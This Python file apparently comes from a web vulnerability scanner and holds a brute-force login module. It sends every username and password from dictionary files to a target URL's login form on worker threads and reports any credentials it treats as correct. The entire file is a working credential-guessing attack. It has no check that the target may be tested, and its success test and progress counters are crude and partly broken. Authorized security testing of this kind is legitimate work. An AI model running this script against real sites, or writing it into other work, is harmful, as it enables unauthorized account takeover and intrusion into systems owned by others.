import concurrent.futures
import time

from Tests.Test import Test
import requests


class BruteForce(Test):
    usernames = None
    passwords = None

    def __init__(self):
        super().__init__()
        self.cancel = False
        with open(r"dictionaries\usernames.txt", "r") as usernames:
            self.usernames = [*usernames]
        with open(r"dictionaries\passwords.txt", "r") as passwords:
            self.passwords = [*passwords]
        self.name = "Brute Force"
        self.future = None

    def run(self, url: str):
        self.cancel = False
        with concurrent.futures.ThreadPoolExecutor() as executor:
            self.future = executor.submit(self.bruteCracking, url)
        self.future = None

    def bruteCracking(self, url):
        count = 0
        user_count = 0
        pass_len = len(self.passwords)
        user_len = len(self.usernames)
        for username in self.usernames:
            user_count = user_count + 1
            for password in self.passwords:
                if self.cancel:
                    self.cancel_result(url, user_count, count)
                    return
                password = password.strip()
                count = count + 1
                print(f'''Trying user ({user_count}/{user_len}): {username}''', f'''Trying password ({count}/{pass_len}): {password}''')
                data_dict = {"email": username, "password": password}
                try:
                    response = requests.post(url, data=data_dict)
                except Exception as e:
                    print(e)
                    continue
                except:
                    print("Some Error Occurred Please Check Your Internet Connection !!")
                    continue
                if "Wrong password" in str(response.content):
                    continue
                elif "csrf" in str(response.content).lower():
                    print("CSRF Token Detected!! BruteF0rce Not Working This Website.")
                    self.csrf_failure(url)
                    return
                elif response.status_code != 200:
                    print("Username: ---> " + username)
                    print("Password: ---> " + password)
                    print("Wrong")
                else:
                    print("Username: ---> " + username)
                    print("Password: ---> " + password)
                    print("CORRECT")
                    print("This Site is vulnerable against the BruteForce attack!")
                    self.success(username, password, url)
                    return
        self.failure(url)

    def failure(self, url):
        result = f'''Brute force scanning done for page {url}\n''' \
                 '''Was a failure'''
        self.results.append((time.time(), result))

    def csrf_failure(self, url):
        result = f'''Brute force scanning done for page {url}\n''' \
                 '''Was stopped due to CSRF Token Detected!!\n'''\
                 '''BruteF0rce Not Working This Website'''
        self.results.append((time.time(), result))

    def success(self, username, password, url):
        result = f'''Brute force scanning done for page {url}\n'''\
                '''Was a success for credentials:\n'''\
                f'''Username: {username}\n'''\
                f'''Password: {password}'''
        self.results.append((time.time(), result))

    def cancel_result(self, url, user_count, count):
        result = f'''Brute force scan for page {url}\n'''\
                '''Was canceled\n'''\
                f'''Users fully checked: {user_count-1}/{len(self.usernames)}\n'''\
                f'''Password checked for user num {user_count}: {count}/{len(self.passwords)}'''
        self.results.append((time.time(), result))

